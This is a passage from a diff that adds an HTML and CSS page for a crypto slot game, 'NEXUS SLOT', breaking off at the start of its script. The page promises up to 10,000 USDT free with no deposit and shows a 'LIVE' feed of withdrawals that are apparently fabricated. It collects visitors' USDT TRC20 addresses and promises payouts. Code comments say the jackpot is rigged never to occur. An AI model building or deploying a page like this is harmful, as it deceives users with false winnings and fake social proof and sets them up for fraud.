@@ -1,1 +1,642 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,viewport-fit=cover"/>
+<meta name="theme-color" content="#0B0C10"/>
+<meta name="apple-mobile-web-app-capable" content="yes"/>
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
+<meta name="format-detection" content="telephone=no"/>
+<title>NEXUS SLOT · Quantum Reels</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;800&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --bg:#0B0C10;--cyan:#00F0FF;--gold:#FFD700;
+  --d:Orbitron,sans-serif;--n:Rajdhani,system-ui,sans-serif;
+  --sym:min(60px,max(42px,calc((100vw - 96px)/5)));
+  --reel-h:calc(var(--sym)*3);
+  --st:env(safe-area-inset-top,0px);--sb:env(safe-area-inset-bottom,0px);
+}
+*,*::before,*::after{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;width:100%;height:100%;height:100dvh;overflow:hidden;background:var(--bg);color:#e8eefc;font-family:var(--n);touch-action:manipulation;overscroll-behavior:none;user-select:none;-webkit-user-select:none;-webkit-touch-callout:none;-webkit-text-size-adjust:100%}
+input{user-select:text;-webkit-user-select:text}
+body{position:fixed;inset:0}
+.bg-stage{position:absolute;inset:0;background:radial-gradient(ellipse 80% 50% at 50% -10%,rgba(176,38,255,.22),transparent 55%),radial-gradient(ellipse 70% 40% at 80% 100%,rgba(0,240,255,.12),transparent 50%),radial-gradient(ellipse 50% 30% at 10% 80%,rgba(255,209,102,.08),transparent 50%),var(--bg)}
+.bg-grid{position:absolute;inset:0;background-image:linear-gradient(rgba(0,240,255,.045) 1px,transparent 1px),linear-gradient(90deg,rgba(0,240,255,.045) 1px,transparent 1px);background-size:28px 28px;mask-image:radial-gradient(ellipse at center,#000 30%,transparent 78%);pointer-events:none}
+.orb{position:absolute;border-radius:50%;filter:blur(48px);pointer-events:none;animation:orbDrift 12s ease-in-out infinite alternate}
+.orb-a{width:180px;height:180px;background:rgba(0,240,255,.18);top:8%;left:-40px}
+.orb-b{width:220px;height:220px;background:rgba(176,38,255,.16);bottom:6%;right:-60px;animation-delay:-4s}
+@keyframes orbDrift{to{transform:translate(24px,-18px) scale(1.12)}}
+.scanlines{position:absolute;inset:0;pointer-events:none;background:repeating-linear-gradient(transparent 0 2px,rgba(0,0,0,.08) 3px);opacity:.35;mix-blend-mode:overlay}
+#app{position:relative;z-index:1;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding:calc(8px + var(--st)) 12px calc(10px + var(--sb));overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;scrollbar-width:none}
+#app::-webkit-scrollbar{display:none}
+.shell{width:100%;max-width:430px;display:flex;flex-direction:column;gap:8px;padding-bottom:20px;flex-shrink:0}
+.header,.brand,.header-actions,.wallet{display:flex;align-items:center}
+.header{justify-content:space-between;gap:10px}
+.brand{gap:10px}
+.logo{width:38px;height:38px;border-radius:11px;display:grid;place-items:center;background:linear-gradient(145deg,rgba(0,240,255,.25),rgba(176,38,255,.2));border:1px solid rgba(0,240,255,.45);box-shadow:0 0 16px rgba(0,240,255,.25),inset 0 1px 0 rgba(255,255,255,.2)}
+.brand-title{font-family:var(--d);font-weight:800;font-size:15px;letter-spacing:.12em;line-height:1.1;background:linear-gradient(90deg,#fff,var(--cyan),#c084fc);-webkit-background-clip:text;background-clip:text;color:transparent}
+.brand-sub{font-size:10px;letter-spacing:.28em;color:rgba(0,240,255,.7);text-transform:uppercase}
+.header-actions{gap:8px;flex-shrink:0}
+.wallet{gap:6px;flex-shrink:0;padding:6px 10px 6px 8px;border-radius:999px;background:rgba(19,21,31,.85);border:1px solid rgba(255,209,102,.35);box-shadow:0 0 12px rgba(255,209,102,.12),inset 0 1px 0 rgba(255,255,255,.06);backdrop-filter:blur(10px);white-space:nowrap}
+.wallet-amt{font-family:var(--n);font-weight:700;font-size:16px;color:var(--gold);letter-spacing:.04em;min-width:4.2em;display:inline-block;text-align:right;font-variant-numeric:tabular-nums}
+.wallet-unit{font-family:var(--d);font-size:9px;letter-spacing:.08em;color:rgba(255,224,160,.7)}
+.icon-btn{width:34px;height:34px;padding:0;border-radius:10px;display:inline-flex;align-items:center;justify-content:center;background:rgba(19,21,31,.8);border:1px solid rgba(0,240,255,.25);color:var(--cyan);line-height:0}
+.icon-btn svg{display:block;width:16px;height:16px}
+#iconSoundOn{transform:translateX(1px)}
+.hidden{display:none!important}
+.lang-select-wrap{position:relative;margin:4px 0 6px;flex-shrink:0}
+.lang-select-wrap::after{content:"▼";position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:10px;color:var(--cyan);pointer-events:none;}
+.lang-select{width:100%;height:40px;padding:0 36px 0 14px;border-radius:12px;background:rgba(19,21,31,.85);border:1px solid rgba(0,240,255,.3);color:#e8eefc;font-family:var(--n);font-size:14px;font-weight:600;letter-spacing:.04em;cursor:pointer;outline:none;appearance:none;-webkit-appearance:none;transition:border-color .2s,box-shadow .2s;}
+.lang-select:hover,.lang-select:focus{border-color:var(--cyan);box-shadow:0 0 14px rgba(0,240,255,.25);}
+.lang-select option{background:#12141f;color:#e8eefc;font-size:14px;}
+.howto-play{position:relative;padding:12px 14px;border-radius:16px;background:linear-gradient(165deg,rgba(30,34,52,.9),rgba(14,16,26,.95));border:1px solid rgba(0,240,255,.3);box-shadow:0 0 20px rgba(0,240,255,.08),inset 0 1px 0 rgba(255,255,255,.06);text-align:left;flex-shrink:0}
+.howto-play h3{margin:0 0 8px;font-family:var(--d);font-size:13px;letter-spacing:.14em;color:var(--cyan);display:flex;align-items:center;gap:6px;}
+.howto-play h3 svg{width:16px;height:16px;flex-shrink:0;}
+.howto-play p{margin:0 0 6px;font-size:13px;line-height:1.5;color:rgba(220,230,245,.85);}
+.howto-play p:last-child{margin-bottom:0;}
+.howto-play em{font-style:normal;color:#FFD700;font-weight:600;}
+.howto-play .highlight-cyan{color:#7AF7FF;font-weight:600;}
+.promo-banner{position:relative;text-align:center;padding:11px 12px 12px;border-radius:16px;overflow:hidden;background:radial-gradient(ellipse at 50% 0,rgba(255,215,0,.18),transparent 58%),linear-gradient(180deg,rgba(20,28,24,.95),rgba(10,14,18,.96));border:1px solid rgba(0,255,196,.55);box-shadow:0 0 16px rgba(0,255,170,.22),0 0 28px rgba(255,215,0,.16),inset 0 0 18px rgba(0,255,196,.08);flex-shrink:0}
+.promo-banner::before,.machine::before{content:"";position:absolute;inset:0;border-radius:inherit;padding:1px;pointer-events:none;-webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);-webkit-mask-composite:xor;mask-composite:exclude}
+.promo-banner::before{background:linear-gradient(120deg,#00FFC6,#00F0FF 35%,#FFD700 70%,#00FFC6);background-size:220% 220%;animation:bannerBorder 4.5s linear infinite}
+@keyframes bannerBorder{to{background-position:200% 50%}}
+.banner-title{position:relative;margin:0;display:flex;flex-direction:column;align-items:center;gap:1px;font-family:var(--d);font-weight:800;letter-spacing:.04em;line-height:1.12;color:#FFD700;text-shadow:0 0 8px #FFD700,0 0 12px #FFD700,0 0 24px rgba(255,215,0,.7);animation:goldPulse 2s ease-in-out infinite}
+.banner-kicker,.banner-end{font-size:clamp(12px,3.7vw,15px);letter-spacing:.14em}
+.banner-amt{display:block;font-size:clamp(22px,7.4vw,30px);letter-spacing:.06em;line-height:1.05;text-shadow:0 0 10px #FFD700,0 0 18px #FFD700,0 0 32px rgba(255,215,0,.9)}
+@keyframes goldPulse{50%{filter:brightness(1.22)}}
+.banner-sub{position:relative;margin:7px 0 0;font-weight:600;font-size:clamp(12px,3.4vw,14px);line-height:1.35;color:#f4fbff;text-shadow:0 0 8px rgba(0,240,255,.35)}
+.banner-sub em{font-style:normal;color:#7AF7FF;text-shadow:0 0 10px rgba(0,240,255,.7)}
+.machine{position:relative;padding:12px 10px;border-radius:24px;background:linear-gradient(165deg,rgba(40,44,64,.9) 0%,rgba(18,20,30,.96) 42%,#0c0d14 100%);box-shadow:0 0 0 1px rgba(0,240,255,.22),0 0 40px rgba(80,40,200,.22),0 18px 40px rgba(0,0,0,.55),inset 0 1px 0 rgba(255,255,255,.1),inset 0 -20px 40px rgba(0,0,0,.35);flex-shrink:0}
+.machine::before{background:linear-gradient(135deg,rgba(0,240,255,.55),rgba(176,38,255,.15) 40%,rgba(255,209,102,.35))}
+.jackpot-bar{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;padding:8px 10px;border-radius:10px;background:linear-gradient(90deg,transparent,rgba(255,215,0,.12),transparent);border:1px solid rgba(255,215,0,.28)}
+.jackpot-label,.jackpot-val{font-family:var(--d)}
+.jackpot-label{font-size:12px;letter-spacing:.22em;color:rgba(255,215,0,.88)}
+.jackpot-val{font-weight:800;font-size:16px;color:#FFD700;text-shadow:0 0 12px rgba(255,215,0,.65);animation:goldBreath 3.2s ease-in-out infinite}
+@keyframes goldBreath{0%,100%{opacity:.82;text-shadow:0 0 8px rgba(255,215,0,.4)}50%{opacity:1;text-shadow:0 0 16px #FFD700,0 0 32px rgba(255,215,0,.5)}}
+.reels-stage{position:relative;display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:4px;padding:8px;border-radius:12px;overflow:hidden;background:#08090e;box-shadow:inset 0 0 18px rgba(0,0,0,.55),0 0 0 1px rgba(255,255,255,.04)}
+.reels-stage::after{content:"";position:absolute;inset:0;z-index:6;pointer-events:none;border-radius:inherit;background:linear-gradient(180deg,rgba(10,12,18,.85),transparent 20%,transparent 80%,rgba(10,12,18,.85))}
+.reel{position:relative;min-width:0;height:var(--reel-h);overflow:hidden;border-radius:8px;background:#0b0e14;box-shadow:inset 0 0 15px rgba(0,0,0,.9),inset 0 12px 10px rgba(0,0,0,.8),inset 0 -12px 10px rgba(0,0,0,.8)}
+.reel-strip{will-change:transform}
+.reel.is-spinning .reel-strip{filter:blur(1px)}
+.sym{position:relative;height:var(--sym);width:100%;padding:3px 4px;display:grid;place-items:center;opacity:.65}
+.sym-card{width:100%;height:100%;border-radius:8px;display:grid;place-items:center;background:linear-gradient(180deg,rgba(255,255,255,.05),rgba(0,0,0,.2));border:1.5px solid transparent;box-shadow:inset 0 1px 0 rgba(255,255,255,.12),0 3px 6px rgba(0,0,0,.6)}
+.sym-card svg{width:83%;height:83%;overflow:visible;filter:drop-shadow(0 2px 4px rgba(0,0,0,.8))}
+.sym-btc{color:#F7931A}.sym-eth{color:#627EEA}.sym-sol{color:#9945FF}.sym-doge{color:#C2A633}.sym-usdt{color:#26A17B}.sym-trx{color:#EF0027}
+.sym.on-payline{opacity:1;z-index:2}
+.sym.on-payline .sym-card{background:rgba(255,255,255,.08);border:1px solid rgba(255,204,0,.3);box-shadow:inset 0 0 10px rgba(255,204,0,.12),inset 0 1px 0 rgba(255,255,255,.16),0 3px 6px rgba(0,0,0,.55)}
+.sym.is-win{opacity:1;z-index:3}
+.sym.is-win .sym-card{border:1.5px solid #ffcc00;background:linear-gradient(180deg,rgba(255,204,0,.12),rgba(0,0,0,.18));box-shadow:inset 0 1px 0 rgba(255,255,255,.16),0 0 15px rgba(255,204,0,.4),0 3px 6px rgba(0,0,0,.55)}
+.tick{position:absolute;top:50%;z-index:7;width:0;height:0;transform:translateY(-50%);pointer-events:none;opacity:.7;border-top:5px solid transparent;border-bottom:5px solid transparent}
+.tick.l{left:1px;border-left:7px solid rgba(255,204,0,.75)}
+.tick.r{right:1px;border-right:7px solid rgba(255,204,0,.75)}
+.paytable{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:10px}
+.pay-item{display:flex;align-items:center;justify-content:space-between;padding:7px 10px;border-radius:10px;background:rgba(8,10,16,.7);border:1px solid rgba(255,255,255,.06);font-size:12px;letter-spacing:.04em;transition:opacity .28s,filter .28s,box-shadow .28s,border-color .28s}
+.paytable.is-resolved .pay-item{opacity:.4;filter:grayscale(.25) brightness(.85)}
+.paytable.is-resolved .pay-item.is-hit{opacity:1;filter:none;border-color:rgba(255,215,0,.75);box-shadow:0 0 16px rgba(255,215,0,.35),inset 0 0 10px rgba(255,215,0,.08);animation:payHit 1.4s ease-in-out infinite}
+@keyframes payHit{50%{box-shadow:0 0 22px rgba(255,215,0,.55)}}
+.pay-k{color:rgba(200,210,230,.75)}
+.pay-v{font-family:var(--d);font-size:11px;color:var(--gold);font-weight:700}
+.paytable.is-resolved .pay-item.is-hit .pay-k{color:#fff6d0}
+.paytable.is-resolved .pay-item.is-hit .pay-v{color:#FFD700;text-shadow:0 0 10px rgba(255,215,0,.6)}
+.spin-wrap{margin-top:12px}
+.spin-btn{position:relative;width:100%;height:56px;border:0;border-radius:16px;cursor:pointer;font-family:var(--d);font-weight:800;font-size:16px;letter-spacing:.18em;color:#041018;background:linear-gradient(180deg,#7af7ff 0%,var(--cyan) 38%,#12b8d4 100%);box-shadow:0 0 0 1px rgba(255,255,255,.25) inset,0 8px 0 #0a6e80,0 12px 24px rgba(0,240,255,.28),0 0 28px rgba(0,240,255,.35);animation:btnPulse 2s ease-out infinite;transition:transform .08s,filter .35s,background .45s,color .45s,box-shadow .45s,letter-spacing .35s}
+.spin-btn::after{content:"";position:absolute;left:10%;right:10%;top:6px;height:40%;border-radius:12px;background:linear-gradient(180deg,rgba(255,255,255,.45),transparent);pointer-events:none}
+@keyframes btnPulse{0%{box-shadow:0 0 0 0 rgba(0,240,255,.55),0 8px 0 #0a6e80,0 12px 24px rgba(0,240,255,.28)}70%{box-shadow:0 0 0 14px rgba(0,240,255,0),0 8px 0 #0a6e80,0 12px 24px rgba(0,240,255,.28)}}
+.spin-btn:active:not(:disabled){transform:translateY(6px);box-shadow:0 0 0 1px rgba(255,255,255,.25) inset,0 2px 0 #0a6e80,0 6px 16px rgba(0,240,255,.3);animation:none}
+.spin-btn:disabled:not(.is-extract){animation:none;cursor:not-allowed;filter:grayscale(.15) brightness(.82);transform:none;box-shadow:0 0 0 1px rgba(255,255,255,.12) inset,0 6px 0 #0a4a56}
+.spin-btn.is-extract{filter:none;cursor:pointer;color:#f4f7ff;letter-spacing:.12em;font-size:14px;background:linear-gradient(180deg,#d8b4fe 0%,#a855f7 28%,#4f46e5 72%,#22d3ee 100%);box-shadow:0 0 0 1px rgba(255,255,255,.22) inset,0 8px 0 #3b1d8f,0 0 28px rgba(168,85,247,.5),0 0 18px rgba(34,211,238,.35);animation:extractPulse 2s ease-out infinite}
+.spin-btn.is-extract:active:not(:disabled){transform:translateY(6px);box-shadow:0 0 0 1px rgba(255,255,255,.22) inset,0 2px 0 #3b1d8f,0 0 22px rgba(168,85,247,.45)}
+@keyframes extractPulse{0%{box-shadow:0 0 0 0 rgba(168,85,247,.55),0 8px 0 #3b1d8f,0 0 28px rgba(34,211,238,.28)}70%{box-shadow:0 0 0 14px rgba(168,85,247,0),0 8px 0 #3b1d8f,0 0 28px rgba(34,211,238,.28)}}
+.spins-left{margin-top:8px;text-align:center;font-family:var(--d);font-size:11px;letter-spacing:.14em;color:rgba(0,240,255,.75)}
+.spins-left strong{color:#fff}
+.rolling-addresses{margin-top:10px;border-radius:12px;overflow:hidden;background:rgba(8,10,16,.8);border:1px solid rgba(0,240,255,.2);box-shadow:inset 0 0 20px rgba(0,0,0,.5);}
+.rolling-title{display:flex;align-items:center;justify-content:space-between;padding:6px 10px;background:rgba(0,240,255,.06);border-bottom:1px solid rgba(0,240,255,.15);font-family:var(--d);font-size:10px;letter-spacing:.12em;color:rgba(0,240,255,.7);}
+.rolling-list{height:100px;overflow:hidden;position:relative;}
+.rolling-inner{display:flex;flex-direction:column;transition:transform .6s ease-in-out;}
+.rolling-item{display:flex;justify-content:space-between;align-items:center;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,.04);font-size:11px;letter-spacing:.02em;flex-shrink:0;height:20px;line-height:20px;white-space:nowrap;}
+.rolling-item .addr{color:#7AF7FF;font-family:monospace;font-size:10px;overflow:hidden;text-overflow:ellipsis;max-width:70%;}
+.rolling-item .amt{color:#FFD700;font-weight:700;font-family:var(--d);font-size:10px;flex-shrink:0;}
+.rolling-item .amt::before{content:"+";}
+.toast{position:fixed;left:50%;bottom:22%;transform:translateX(-50%) translateY(12px);padding:8px 16px;border-radius:999px;background:rgba(13,14,21,.92);border:1px solid rgba(0,240,255,.35);font-family:var(--d);font-size:11px;letter-spacing:.12em;color:var(--cyan);opacity:0;pointer-events:none;z-index:30;transition:opacity .25s,transform .25s}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+.modal{position:fixed;inset:0;z-index:50;display:flex;align-items:center;justify-content:center;padding:20px;background:rgba(4,6,12,.72);backdrop-filter:blur(8px);opacity:0;pointer-events:none;transition:opacity .28s}
+.modal.open{opacity:1;pointer-events:auto}
+.modal-card{width:min(360px,100%);padding:28px 22px 22px;border-radius:22px;text-align:center;background:radial-gradient(ellipse at 50% 0,rgba(255,209,102,.16),transparent 50%),linear-gradient(180deg,#1a1d2c,#10121a);box-shadow:0 0 0 1px rgba(255,209,102,.35),0 0 50px rgba(176,38,255,.25),0 24px 48px rgba(0,0,0,.5);transform:scale(.86) translateY(16px);transition:transform .35s cubic-bezier(.16,1,.3,1)}
+.modal.open .modal-card{transform:none}
+.modal.jackpot .modal-card{box-shadow:0 0 0 1px rgba(255,209,102,.7),0 0 60px rgba(255,209,102,.35),0 24px 48px rgba(0,0,0,.5)}
+.modal-kicker{font-family:var(--d);font-size:11px;letter-spacing:.32em;color:var(--cyan)}
+.modal-kicker svg{width:12px;height:12px;margin-right:4px;vertical-align:-2px}
+.modal-title{margin:8px 0 4px;font-family:var(--d);font-weight:800;font-size:22px;letter-spacing:.08em;line-height:1.25;background:linear-gradient(90deg,#fff,var(--gold),#fff);-webkit-background-clip:text;background-clip:text;color:transparent}
+.modal-amt{font-family:var(--d);font-weight:800;font-size:34px;color:var(--gold);text-shadow:0 0 24px rgba(255,209,102,.55);margin:8px 0 4px}
+.modal-desc{color:rgba(200,210,230,.7);font-size:14px;margin-bottom:18px}
+.claim-btn,.submit-btn{width:100%;height:50px;border:0;border-radius:14px;cursor:pointer;font-family:var(--d);font-weight:800;letter-spacing:.12em}
+.claim-btn{font-size:13px;letter-spacing:.14em;color:#1a1204;background:linear-gradient(180deg,#ffe08a,var(--gold) 40%,#d4a017);box-shadow:0 8px 0 #8a6a12,0 0 24px rgba(255,209,102,.35)}
+.claim-btn:active{transform:translateY(5px);box-shadow:0 3px 0 #8a6a12}
+.extract-card{text-align:left}
+.extract-card .modal-kicker,.extract-card .modal-title{text-align:center}
+.extract-amt{text-align:center;font-family:var(--d);font-weight:800;font-size:28px;color:#FFD700;text-shadow:0 0 18px rgba(255,215,0,.5);margin:4px 0 16px}
+.field-label{display:block;font-family:var(--d);font-size:9px;letter-spacing:.14em;color:#7AF7FF;margin-bottom:8px}
+.field-input{width:100%;height:48px;border-radius:12px;border:1px solid rgba(0,240,255,.35);background:rgba(8,10,16,.9);color:#e8eefc;font-family:var(--n);font-size:16px;letter-spacing:.04em;padding:0 12px;outline:0}
+.field-input:focus{border-color:#00F0FF;box-shadow:0 0 14px rgba(0,240,255,.25)}
+.field-input.is-invalid{border-color:#ff5a7a;box-shadow:0 0 12px rgba(255,90,122,.25)}
+.field-err{min-height:18px;margin:6px 0 12px;font-size:12px;color:#ff8aa0}
+.submit-btn{font-size:12px;color:#f8fbff;background:linear-gradient(180deg,#67e8f9,#22d3ee 30%,#7c3aed);box-shadow:0 8px 0 #4c1d95,0 0 22px rgba(124,58,237,.35)}
+.submit-btn:active{transform:translateY(5px);box-shadow:0 3px 0 #4c1d95}
+.addr-box{margin:12px 0 18px;padding:10px 12px;border-radius:10px;background:rgba(8,12,20,.85);border:1px solid rgba(0,240,255,.28);font-family:var(--n);font-size:13px;word-break:break-all;color:#7AF7FF;text-align:left}
+.confirm-copy{color:rgba(220,230,245,.86);font-size:14px;line-height:1.55;margin:8px 0 0;text-align:center}
+.confirm-copy strong{color:#FFD700}
+.corner{position:absolute;width:10px;height:10px;border-radius:50%;background:radial-gradient(circle at 35% 35%,#d0d4e0,#4a5166);box-shadow:inset 0 1px 1px rgba(255,255,255,.5),0 0 6px rgba(0,240,255,.3)}
+.corner.tl{top:10px;left:10px}.corner.tr{top:10px;right:10px}.corner.bl{bottom:10px;left:10px}.corner.br{bottom:10px;right:10px}
+@media(max-width:380px){.pay-item{padding:6px 7px;font-size:11px}.pay-v{font-size:10px}.wallet-amt{min-width:3.6em;font-size:15px}.lang-select{font-size:13px;height:36px}}
+@media(max-height:740px){:root{--sym:min(54px,max(40px,calc((100vw - 96px)/5)))}.promo-banner{padding:8px 10px 9px}.banner-kicker,.banner-end{font-size:12px}.banner-amt{font-size:clamp(20px,6.6vw,26px)}.banner-sub{margin-top:5px;font-size:12px}.jackpot-val{font-size:14px}.jackpot-bar{padding:6px 8px;margin-bottom:8px}.spin-btn{height:50px;font-size:14px}.pay-item{padding:6px 8px}.howto-play{padding:10px 12px}.howto-play p{font-size:12px}.rolling-list{height:90px}.lang-select{height:36px;font-size:13px}}
+@media(max-height:680px){:root{--sym:min(48px,max(38px,calc((100vw - 96px)/5)))}.banner-kicker,.banner-end{font-size:11px}.banner-amt{font-size:20px}.banner-sub{font-size:11px}.modal-amt{font-size:28px}}
+</style>
+</head>
+<body>
+<div class="bg-stage"></div>
+<div class="bg-grid"></div>
+<div class="orb orb-a"></div>
+<div class="orb orb-b"></div>
+<div class="scanlines"></div>
+<div id="app">
+<div class="shell">
+<header class="header">
+<div class="brand">
+<div class="logo" aria-hidden="true"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2L4 7v5c0 5.2 3.4 10 8 11 4.6-1 8-5.8 8-11V7l-8-5z" stroke="#00F0FF" stroke-width="1.6" fill="rgba(0,240,255,.12)"/><path d="M12 8v8M8.5 12h7" stroke="#FFD166" stroke-width="1.6" stroke-linecap="round"/></svg></div>
+<div>
+<div class="brand-title">NEXUS</div>
+<div class="brand-sub">Quantum Slot</div>
+</div>
+</div>
+<div class="header-actions">
+<button id="muteBtn" class="icon-btn" type="button" aria-label="Toggle sound">
+<svg id="iconSoundOn" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5.5,9 9.5,9 14,5.5 14,18.5 9.5,15 5.5,15"/><path d="M16.8 9.5a4.2 4.2 0 0 1 0 5"/><path d="M19.2 7.4a7.2 7.2 0 0 1 0 9.2"/></svg>
+<svg id="iconSoundOff" class="hidden" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5.5,9 9.5,9 14,5.5 14,18.5 9.5,15 5.5,15"/><path d="M17 9l5 6M22 9l-5 6"/></svg>
+</button>
+<div class="wallet">
+<svg width="16" height="16" viewBox="0 0 32 32" aria-hidden="true"><circle cx="16" cy="16" r="14" fill="#26A17B"/><path fill="#fff" d="M17.7 17.4v2.3c3 .16 5.25.88 5.25 1.74 0 .86-2.25 1.58-5.25 1.74v2.79h-1.9v-2.76c-3.07-.18-5.36-.94-5.36-1.85 0-.9 2.29-1.66 5.36-1.84v-2.36c-2.18.14-3.7.7-3.7 1.38H9.3c0-1.22 2.4-2.14 5.5-2.3V13h1.9v1.12c3.02.16 5.26.9 5.26 1.82 0 .93-2.24 1.66-5.26 1.82zm-1.9-.32v-2.2c-2.05.12-3.38.6-3.38 1.16 0 .56 1.33 1.04 3.38 1.16zm1.9 4.86v-2.28c2.1.13 3.48.64 3.48 1.22s-1.38 1.08-3.48 1.2z"/></svg>
+<span class="wallet-amt" id="balanceText">0.00</span>
+<span class="wallet-unit">USDT</span>
+</div>
+</div>
+</header>
 
+<div class="lang-select-wrap">
+  <select id="langSelect" class="lang-select" aria-label="Select Language">
+    <option value="en">🇺🇸 English</option>
+    <option value="zh">🇨🇳 中文</option>
+    <option value="es">🇪🇸 Español</option>
+    <option value="hi">🇮🇳 हिन्दी</option>
+    <option value="ar">🇸🇦 العربية</option>
+    <option value="pt">🇧🇷 Português</option>
+    <option value="ru">🇷🇺 Русский</option>
+    <option value="ja">🇯🇵 日本語</option>
+    <option value="de">🇩🇪 Deutsch</option>
+    <option value="fr">🇫🇷 Français</option>
+    <option value="ko">🇰🇷 한국어</option>
+    <option value="it">🇮🇹 Italiano</option>
+    <option value="tr">🇹🇷 Türkçe</option>
+    <option value="vi">🇻🇳 Tiếng Việt</option>
+    <option value="th">🇹🇭 ไทย</option>
+    <option value="id">🇮🇩 Bahasa Indonesia</option>
+    <option value="ms">🇲🇾 Bahasa Melayu</option>
+    <option value="nl">🇳🇱 Nederlands</option>
+    <option value="pl">🇵🇱 Polski</option>
+  </select>
+</div>
+
+<section class="howto-play">
+<h3><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg> <span id="howtoTitleText">How to Play · Game Description</span></h3>
+<p id="howtoP1"><span class="highlight-cyan">Spin the 5 reels</span> to match crypto symbols. You get <em>3 free spins</em> to start — no deposit needed!</p>
+<p id="howtoP2">Match <em>2+ identical symbols</em> on the center payline to win. Win up to <em>10,000 USDT</em> for 5-of-a-kind!</p>
+<p id="howtoP3">After your spins, claim winnings to your balance, then <span class="highlight-cyan">extract rewards</span> via USDT TRC20.</p>
+</section>
+
+<section class="promo-banner">
+<h1 class="banner-title"><span class="banner-kicker" id="bannerKicker">WIN UP TO</span><span class="banner-amt" id="bannerAmt">10,000 USDT</span><span class="banner-end" id="bannerEnd">FOR FREE!</span></h1>
+<p class="banner-sub" id="bannerSub">Spin 3 times to unlock your starting balance. <em>No deposit required to play!</em></p>
+</section>
+<section class="machine">
+<span class="corner tl"></span><span class="corner tr"></span><span class="corner bl"></span><span class="corner br"></span>
+<div class="jackpot-bar"><span class="jackpot-label">JACKPOT</span><span class="jackpot-val">10,000 USDT</span></div>
+<div class="reels-stage" id="reelsStage"><span class="tick l"></span><span class="tick r"></span></div>
+<div class="paytable" id="paytable">
+<div class="pay-item" data-n="2"><span class="pay-k">2× MATCH</span><span class="pay-v">10 USDT</span></div>
+<div class="pay-item" data-n="3"><span class="pay-k">3× MATCH</span><span class="pay-v">30 USDT</span></div>
+<div class="pay-item" data-n="4"><span class="pay-k">4× MATCH</span><span class="pay-v">200 USDT</span></div>
+<div class="pay-item" data-n="5"><span class="pay-k">5× MATCH</span><span class="pay-v">10,000 USDT</span></div>
+</div>
+<div class="spin-wrap">
+<button id="spinBtn" class="spin-btn" type="button">SPIN NOW</button>
+<div class="spins-left" id="spinsLeftDiv">FREE SPINS REMAINING: <strong id="spinsText">3</strong>/3</div>
+<div class="rolling-addresses">
+  <div class="rolling-title"><span id="rollingTitleText">⛓ RECENT TRC20 WITHDRAWALS</span><span>LIVE</span></div>
+  <div class="rolling-list" id="rollingList">
+    <div class="rolling-inner" id="rollingInner"></div>
+  </div>
+</div>
+</div>
+</section>
+</div>
+</div>
+<div id="toast" class="toast"></div>
+<div id="winModal" class="modal">
+<div class="modal-card">
+<div class="modal-kicker" id="modalKicker">NEON PAYOUT</div>
+<h2 class="modal-title" id="modalTitle">YOU WIN</h2>
+<div class="modal-amt" id="modalAmt">+0 USDT</div>
+<p class="modal-desc" id="modalDesc"></p>
+<button id="claimBtn" class="claim-btn" type="button">CLAIM TO BALANCE</button>
+</div>
+</div>
+<div id="extractModal" class="modal">
+<div class="modal-card extract-card">
+<div class="modal-kicker"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="20" height="14" rx="2"/><path d="M2 10h20"/><circle cx="16" cy="15" r="1.2" fill="currentColor" stroke="none"/></svg> TRC20 WITHDRAW</div>
+<h2 class="modal-title">EXTRACT</h2>
+<div class="extract-amt" id="extractAmt">0.00 USDT</div>
+<label class="field-label" for="trc20Input">ENTER YOUR USDT TRC20 ADDRESS:</label>
+<input id="trc20Input" class="field-input" type="text" maxlength="48" placeholder="T................................" autocomplete="off" spellcheck="false"/>
+<p class="field-err" id="trc20Err"></p>
+<button id="submitWithdrawBtn" class="submit-btn" type="button">SUBMIT WITHDRAWAL</button>
+</div>
+</div>
+<div id="confirmModal" class="modal">
+<div class="modal-card">
+<div class="modal-kicker">NOTIFICATION</div>
+<h2 class="modal-title">WITHDRAWAL REQUEST SUBMITTED</h2>
+<p class="confirm-copy">Your reward withdrawal request has been submitted successfully!</p>
+<p class="confirm-copy">We will transfer this reward to your wallet within <strong>1 business day</strong>. Please stay tuned and check your account.</p>
+<div class="addr-box" id="confirmAddr"></div>
+<button id="gotItBtn" class="claim-btn" type="button">GOT IT</button>
+</div>
+</div>
+
+<script>
+// ===== 配置：后端 API 地址 =====
+// 生产环境改成你的后端域名，如 'https://api.yoursite.com'
+// 同域部署保持空字符串即可
+const API_BASE = '';
+
+(function(){
+const N=5,EXTRA=28,DELAY=.1,DUR=2.05,STEP=.16,OVER=16,SPINS=3;
+// 中奖金额按连中个数固定对应：2×=10, 3×=30, 4×=200, 5×=10000
+const PAYOUT_BY_MATCH = {2:10, 3:30, 4:200, 5:10000};
+const JACKPOT = 10000;
+// 用户点击时，match 只从 [2,3,4] 随机，5 连不出现
+const MATCH_POOL = [2, 3, 4];
+const SYMS=[
